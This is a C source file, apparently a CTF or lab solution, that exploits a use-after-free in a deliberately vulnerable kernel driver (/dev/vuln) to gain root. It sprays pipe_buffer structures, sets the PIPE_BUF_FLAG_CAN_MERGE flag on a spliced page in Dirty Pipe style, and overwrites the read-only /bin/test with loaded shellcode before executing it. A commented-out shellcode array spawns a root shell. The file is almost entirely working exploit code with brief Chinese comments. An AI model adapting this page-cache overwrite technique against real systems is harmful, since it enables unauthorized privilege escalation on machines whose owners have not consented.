#include "inc/common.h"
#include "inc/snippet.h"

// #include <sys/sem.h>
// #include <sys/ipc.h>
// #include <sys/shm.h>
// #include <semaphore.h>
// #include <sys/xattr.h>
// #include <asm/ldt.h>
// #include <sys/wait.h>
// #include <sys/socket.h>

// #include <malloc.h>
// #include <sys/types.h>
// #include <sys/ipc.h>
// #include <sys/msg.h>
#include <stddef.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/wait.h>

 #include <stdio.h>

#define ADDR cRED "0x%lx" cRST
#define HWBP_ADDR ((void *)07210000)
#define HWBP_SIZE 0x1000
#define addr(var) ok(#var " at " ADDR, var)

const char *devname = "/dev/vuln";

enum CMD {
    ALLOC = 0x0d00,
    FREE,
    UAFW,
    UAFR,
};
struct Req {
    uint64_t addr;
    uint64_t len;
};

void kalloc(u64 size) {
    if(ioctl(devfd, ALLOC, size) < 0)
        panic("ioctl alloc");
}
void kfree() {
    if(ioctl(devfd, FREE, 0) < 0)
        panic("ioctl free");
}
void uafw(u8 *buf, u64 len) {
    struct Req r = {
        .addr = (u64)buf,
        .len  = len,
    };
    if(ioctl(devfd, UAFW, &r) < 0)
        panic("ioctl uafw");
}
void uafr(u8 *buf, u64 len) {
    struct Req r = {
        .addr = (u64)buf,
        .len  = len,
    };
    if(ioctl(devfd, UAFR, &r) < 0)
        panic("ioctl uafr");
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

#define PIPE_CNT 0x10
int fds[PIPE_CNT][2];



struct pipe_buffer {
    u64 *page;
    u32 offset, len;
    u64 *ops;
    u32 flags;
    u64 private;
};


#define page_offset_base 0xffff888000000000
#define vmemmap_base 0xffffea0000000000
#define page_to_va(page) ((((page)-vmemmap_base)/0x40*(1024*4))+(page_offset_base))

#define PIPE_BUF_FLAG_LRU	    0x01	/* page is on the LRU */
#define PIPE_BUF_FLAG_ATOMIC	0x02	/* was atomically mapped */
#define PIPE_BUF_FLAG_GIFT	    0x04	/* page is a gift */
#define PIPE_BUF_FLAG_PACKET	0x08	/* read() as a packet */
#define PIPE_BUF_FLAG_CAN_MERGE	0x10	/* can merge buffers */
#define PIPE_BUF_FLAG_WHOLE	    0x20	/* read() must return entire buffer or error */

void show_pb(struct pipe_buffer *pb) {
    printf("page at " ADDR "\n", (u64)pb->page);
    printf("page va at " ADDR "\n", page_to_va((u64)pb->page));
    printf("offset is 0x%x len is 0x%x\n", pb->offset, pb->len);
    printf("ops at " ADDR "\n", (u64)pb->ops);
    printf("flags is 0x%x private is 0x%lx\n", pb->flags, pb->private);
}

// unsigned char shellcode[] = {
//     0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
//     0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
//     0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//     0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62,
//     0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e,
//     0x6a, 0x3b, 0x58, 0x0f, 0x05
// };
// unsigned int shellcode_len = 149;

u8 anon[0x1000] = {1};

u8 shellcode[0x3000];
u64 shlen = 0;

const char *target = "/shellcode.bin";

void load_shellcode() {

    FILE *fp = fopen(target, "r");
    if(fp == NULL) panic("load_shellcode");

    struct stat s;
    if(stat(target, &s) < 0) panic("stat");
    shlen = s.st_size;

    if(fread(shellcode, 1, shlen, fp) != shlen)
        panic("fread");
}

int main()
{
    save_state();
    open_dev(devname, O_RDONLY);
    load_shellcode();

    kalloc(1024);
    kfree();

    act("start to spray pipe_buffer");
    range(i, PIPE_CNT, {
        if(pipe(fds[i]) < 0) {
            panic("pipe %d", i);
        }
        if(write(fds[i][1], anon, i+1) < 0)
            panic("write to %d", i);
    });
    // u8 buf[sizeof(struct pipe_buffer)];
    struct pipe_buffer pb[0x10];
    uafr((u8 *)&pb[0], sizeof(struct pipe_buffer));/* 获得len 得到我们堆喷到的是第几个pb */
    show_pb(&pb[0]);

    ok("heap spray hit %dth", pb[0].len-1);
    int *fd = fds[pb[0].len-1];
    // read(fd[0], anon, pb[0].len-1);

    int target = open("/bin/test", O_RDONLY);
    if(target == -1)
        panic("open");

    loff_t offset = 0x1038 - 1;
    if(splice(
        target,  /* fd_in */
        &offset, /* 从fd_in 的offset处开始读 */
        fd[1],   /* fd_out */
        NULL,    /* 管道不需要指定offset */
        1,       /* fd_in 读一个字节到 fd_out */
        0        /* flags */
    ) < 0) panic("splice");

    uafr((u8 *)pb, sizeof(struct pipe_buffer) * 0x10);
    // hexdump(&pb, sizeof(struct pipe_buffer));
    show_pb(&pb[1]);// 第二个pb才是splice的共享页

    pb[1].flags = PIPE_BUF_FLAG_CAN_MERGE;
    uafw((u8 *)pb, sizeof(struct pipe_buffer) * 2);

    if(write(fd[1], &shellcode[0], shlen) < 0)
        panic("write");

    if(system("/bin/test") < 0)
        panic("system");

    return 0;
}
